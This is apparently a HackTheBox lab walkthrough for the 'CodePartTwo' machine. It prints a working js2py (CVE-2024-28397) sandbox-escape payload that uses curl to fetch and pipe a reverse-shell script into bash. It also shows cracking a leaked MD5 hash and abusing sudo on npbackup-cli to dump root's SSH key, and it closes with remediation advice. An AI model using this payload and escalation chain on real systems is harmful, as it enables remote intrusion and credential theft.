# HackTheBox: CodePartTwo Walkthrough

## Details

| Attribute | Value |
|-----------|-------|
| **Box Name** | CodePartTwo |
| **Difficulty** | Easy |
| **Target IP** | 10.129.232.59 |
| **Hostname** | codeparttwo.htb |
| **Operating System** | Linux (Ubuntu 20.04.6 LTS) |

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User Flag | `/home/marco/user.txt` | Obtained during lateral movement phase |
| Root Flag | `/root/root.txt` | Obtained during privilege escalation |

---

## Command Syntax

### Nmap Scan
```bash
nmap -sC -sV codeparttwo.htb -oN nmap_report
```

### Download and Extract Application
```bash
wget http://codeparttwo.htb:8000/download/app.zip
unzip app.zip
cd app
```

### Start HTTP Server (for payload delivery)
```bash
python3 -m http.server 9000
```

### Start Netcat Listener
```bash
nc -lnvp 4242
```

### Spawn Interactive TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo;fg
export TERM=xterm
```

### Crack Password Hash (using CrackStation)
```bash
# Hash: 649c9d65a206a75f5abe509fe128bce5
# Result: sweetangelbabylove
```

### SSH Access
```bash
ssh marco@codeparttwo.htb
```

### Execute npbackup backup (privilege escalation)
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
```

### List backup contents
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls
```

### Dump root SSH key from backup
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
```

### SSH as root
```bash
chmod 600 id_rsa
ssh -i id_rsa root@codeparttwo.htb
```

---

## Steps

### 1. Enumeration

#### Nmap Scan Results
The initial nmap scan revealed two open ports:
- **22/TCP** - SSH (OpenSSH 8.2p1 Ubuntu)
- **8000/TCP** - HTTP (Gunicorn 20.0.4)

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Gunicorn 20.0.4
```

#### Web Application Analysis
- Access the web application at `http://codeparttwo.htb:8000/`
- Download the application source code (app.zip)
- Examine the application structure:
  ```
  app/
  ├── app.py
  ├── instance/
  │   └── users.db
  ├── requirements.txt
  ├── static/
  │   ├── css/
  │   └── js/
  └── templates/
      ├── base.html
      ├── dashboard.html
      ├── index.html
      ├── login.html
      ├── register.html
      └── reviews.html
  ```

#### Key Findings from Source Code
- `app.secret_key = 'S3cr3tK3yC0d3PartTw0'`
- Uses `js2py.eval_js(code)` for code execution
- Vulnerability: **CVE-2024-28397** (js2py arbitrary code execution)

---

## Exploitation

### Initial Shell Access

#### Step 1: Set up listener and HTTP server
```bash
# Terminal 1: Start Netcat listener
nc -lnvp 4242

# Terminal 2: Start HTTP server
python3 -m http.server 9000
```

#### Step 2: Create malicious JavaScript payload
The application uses js2py which allows JavaScript execution. Using CVE-2024-28397, we can achieve RCE through JavaScript prototype pollution:

```javascript
let cmd = "curl http://10.10.14.202:9000/rev.sh |bash"
let hacked, bymarve, n11
let getattr, objl

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}
```

#### Step 3: Execute the payload
Submit the JavaScript code through the web application's code editor panel. This will:
1. Connect back to our HTTP server and download `rev.sh`
2. Execute the reverse shell script
3. Establish a reverse shell connection to our Netcat listener

#### Step 4: Stabilize the shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo;fg
export TERM=xterm
```

#### Step 5: Verify initial access
```bash
id
# uid=1001(app) gid=1001(app) groups=1001(app)
```

---

## Lateral Movement

### From app user to marco user

#### Step 1: Access the database
Navigate to the instance directory and extract user information:
```bash
cd instance
sqlite3 users.db .dump
```

#### Step 2: Examine the user table
```
CREATE TABLE user (
    id INTEGER NOT NULL, 
    username VARCHAR(80) NOT NULL, 
    password_hash VARCHAR(128) NOT NULL, 
    PRIMARY KEY (id), 
    UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'santstyle','2de8fbf7df1102df7e9d50a54e0075ac');
```

#### Step 3: Crack the password hash
Use CrackStation to crack marco's password hash:
- **Hash**: `649c9d65a206a75f5abe509fe128bce5`
- **Type**: MD5
- **Result**: `sweetangelbabylove`

#### Step 4: SSH access as marco
```bash
ssh marco@codeparttwo.htb
# Password: sweetangelbabylove
```

#### Step 5: Verify lateral movement
```bash
marco@codeparttwo:~$ id
# Confirm access as marco user
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
```

---

## Privilege Escalation

### From marco user to root

#### Step 1: Check sudo permissions
```bash
sudo -l
```

Output shows:
```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

#### Step 2: Examine the npbackup-cli binary
```bash
cat /usr/local/bin/npbackup-cli
```

The binary is a wrapper around `npbackup` that blocks the `--external-backend-binary` flag but can still be exploited.

#### Step 3: Create modified configuration file
Copy and modify the npbackup.conf to backup `/root` directory:
```bash
cp npbackup.conf npbackup1.conf
# Edit npbackup1.conf to include /root in backup paths
```

#### Step 4: Execute backup
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
```

This creates a backup snapshot of `/root` directory.

#### Step 5: List backup contents
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls
```

This reveals the contents of `/root` including:
- `/root/.ssh/id_rsa` - Root's SSH private key
- `/root/root.txt` - Root flag
- `/root/scripts/` - Various scripts

#### Step 6: Extract root's SSH private key
```bash
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
```

Save the private key to a local file:
```bash
chmod 600 id_rsa
```

#### Step 7: SSH as root
```bash
ssh -i id_rsa root@codeparttwo.htb
```

#### Step 8: Verify root access
```bash
root@codeparttwo:~# ls
root.txt  scripts
root@codeparttwo:~# id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Conclusion

### Summary

The CodePartTwo machine was successfully compromised through the following attack chain:

1. **Enumeration**: Discovered open ports 22 (SSH) and 8000 (HTTP) with a Flask application using js2py

2. **Initial Access (app user)**: Exploited CVE-2024-28397 in js2py to achieve remote code execution and obtain a reverse shell as the `app` user

3. **Lateral Movement (marco user)**: 
   - Found password hashes in the SQLite database
   - Cracked marco's password using CrackStation
   - SSH'd into the target as marco

4. **Privilege Escalation (root)**:
   - Discovered sudo permissions for `npbackup-cli`
   - Modified the backup configuration to include `/root`
   - Executed backup to create a snapshot
   - Extracted root's SSH private key from the backup
   - SSH'd as root using the extracted key

### Vulnerabilities Exploited

| Vulnerability | Severity | Description |
|---------------|----------|-------------|
| CVE-2024-28397 | High | js2py arbitrary code execution via prototype pollution |
| Weak Password Storage | Medium | MD5 hashed passwords stored in SQLite database |
| Insecure Sudo Configuration | High | npbackup-cli allows backup of sensitive directories |
| Insufficient Input Validation | High | Allows arbitrary code execution in js2py context |

### Remediation Recommendations

1. **Update js2py**: Replace js2py with a safer alternative or update to a patched version
2. **Password Policy**: Use strong hashing algorithms (bcrypt, argon2) instead of MD5
3. **Sudo Configuration**: Restrict sudo permissions and implement proper access controls
4. **Backup Configuration**: Ensure backup tools cannot access sensitive directories without proper authorization
5. **Web Application Security**: Implement proper input validation and sandboxing for code execution features

